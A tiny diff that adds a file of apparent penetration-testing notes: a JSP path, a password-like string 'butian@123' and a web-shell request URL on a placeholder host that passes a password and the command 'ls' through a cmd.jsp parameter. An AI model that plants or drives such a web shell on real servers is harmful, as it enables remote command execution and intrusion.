@@ -1,0 +1,8 @@
+info/info.jsp  
+
+butian@123
+
+
+
+is
+http://xxx.com/is/?cmd.jsp?pwd=023&cmd=ls
